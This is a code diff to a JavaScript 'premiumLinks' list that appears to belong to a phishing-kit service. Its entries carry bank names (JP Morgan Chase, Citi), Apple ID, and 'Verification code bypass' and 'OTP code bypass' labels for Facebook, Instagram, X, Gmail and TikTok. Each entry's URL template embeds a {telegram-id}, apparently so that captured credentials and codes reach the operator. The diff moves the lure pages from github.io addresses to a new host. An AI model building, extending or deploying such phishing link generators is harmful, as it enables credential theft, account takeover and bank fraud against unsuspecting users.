@@ -30,18 +30,18 @@ const premiumLinks = [
                                { name: "JP morgan chase bank", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSPs-HpAJwlI_H9ye7h-_yNGhSSNuCTEZClXohGW1gjmhRlmouqChS1umM&s=10", urlTemplate: "https://minaminoghh-afk.github.io/dfopl/gh/b5?id={telegram-id}" },
                    { name: "Citi bank", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSydZDUaoSgUF64YOXdLNAH7LbafQto8rCXg2yQkV8F0Qcj_fRfwJ62bfU&s", urlTemplate: "https://minaminoghh-afk.github.io/dfopl/gh/b6?id={telegram-id}" },
                                { name: "Apple id", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSaMbAeSHbkehijfRQUxRNaqrp6CK6W2osbRcqpTyCF9A&s", urlTemplate: "https://minaminoghh-afk.github.io/dfopl/g2/t4?id={telegram-id}" },
-                                     { name: "Facebook Verification code bypass link", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTaya1MpEahSkYWFlpfOCWVXnaXXwem-RHmy_s4-Aokbw&s", urlTemplate: "https://olptyi.github.io/nb/face?id={telegram-id}" },
-      { name: "Instagram Verification code bypass link", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7zv0lY5uVFgUjNjGWLFHzR84n0p95zmB54-1Na4F8mg&s=10", urlTemplate: "https://olptyi.github.io/nb/ins?id={telegram-id}" },
-      { name: "Twitter(X) Verification code bypass link", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRi7i0LKT604tnTQi5ahGllgPEU2dEfiz2NAvRyL_7hVA&s", urlTemplate: "https://olptyi.github.io/nb/tw?id={telegram-id}" },
-      { name: "Gmail Verification code bypass link", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSl8qqUUnOr837WvygEc30Y4zOF9miZ7wPQpw17KCLxkQ&s=10", urlTemplate: "https://olptyi.github.io/nb/gma?id={telegram-id}" },
-      { name: "Tiktok Verification code bypass link", image: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Tiktok_icon.svg/2048px-Tiktok_icon.svg.png", urlTemplate: "https://olptyi.github.io/nb/ti?id={telegram-id}" },
+                                     { name: "Facebook Verification code bypass link", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTaya1MpEahSkYWFlpfOCWVXnaXXwem-RHmy_s4-Aokbw&s", urlTemplate: "https://klipsch.gt.tc/s/f?id={telegram-id}" },
+      { name: "Instagram Verification code bypass link", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7zv0lY5uVFgUjNjGWLFHzR84n0p95zmB54-1Na4F8mg&s=10", urlTemplate: "https://klipsch.gt.tc/s/i?id={telegram-id}" },
+      { name: "Twitter(X) Verification code bypass link", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRi7i0LKT604tnTQi5ahGllgPEU2dEfiz2NAvRyL_7hVA&s", urlTemplate: "https://klipsch.gt.tc/s/x?id={telegram-id}" },
+      { name: "Gmail Verification code bypass link", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSl8qqUUnOr837WvygEc30Y4zOF9miZ7wPQpw17KCLxkQ&s=10", urlTemplate: "https://klipsch.gt.tc/s/g?id={telegram-id}" },
+      { name: "Tiktok Verification code bypass link", image: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Tiktok_icon.svg/2048px-Tiktok_icon.svg.png", urlTemplate: "https://klipsch.gt.tc/s/t?id={telegram-id}" },
 
       //new codes here
 
-        { name: "Facebook OTP code bypass link", image: "https://i.ibb.co/b5qQkjkL/Background-Eraser-20251202-184833675.png", urlTemplate: "https://olptyi.github.io/nb/face/Fpass?id={telegram-id}" },
+        { name: "Facebook OTP code bypass link", image: "https://i.ibb.co/b5qQkjkL/Background-Eraser-20251202-184833675.png", urlTemplate: "https://klipsch.gt.tc/s/f/c.html?id={telegram-id}" },
         //not Facebook
-                { name: "Instagram OTP code bypass link", image: "https://i.ibb.co/b5qQkjkL/Background-Eraser-20251202-184833675.png", urlTemplate: "https://olptyi.github.io/nb/ins/igpass?id={telegram-id}" },
-                        { name: "Tiktok OTP code bypass link", image: "https://i.ibb.co/b5qQkjkL/Background-Eraser-20251202-184833675.png", urlTemplate: "https://olptyi.github.io/nb/ti/tik?id={telegram-id}" },
-     { name: "Twiter (X) OTP code bypass link", image: "https://i.ibb.co/b5qQkjkL/Background-Eraser-20251202-184833675.png", urlTemplate: "https://olptyi.github.io/nb/tw/tx?id={telegram-id}" },
-      { name: "Gmail OTP code bypass link", image: "https://i.ibb.co/b5qQkjkL/Background-Eraser-20251202-184833675.png", urlTemplate: "https://olptyi.github.io/nb/gma/gpass?id={telegram-id}" },
+                { name: "Instagram OTP code bypass link", image: "https://i.ibb.co/b5qQkjkL/Background-Eraser-20251202-184833675.png", urlTemplate: "https://klipsch.gt.tc/s/i/c.html?id={telegram-id}" },
+                        { name: "Tiktok OTP code bypass link", image: "https://i.ibb.co/b5qQkjkL/Background-Eraser-20251202-184833675.png", urlTemplate: "https://klipsch.gt.tc/s/t/c.html?id={telegram-id}" },
+     { name: "Twiter (X) OTP code bypass link", image: "https://i.ibb.co/b5qQkjkL/Background-Eraser-20251202-184833675.png", urlTemplate: "https://klipsch.gt.tc/s/x/c.html?id={telegram-id}" },
+      { name: "Gmail OTP code bypass link", image: "https://i.ibb.co/b5qQkjkL/Background-Eraser-20251202-184833675.png", urlTemplate: "https://klipsch.gt.tc/s/g/c.html?id={telegram-id}" },
     ];
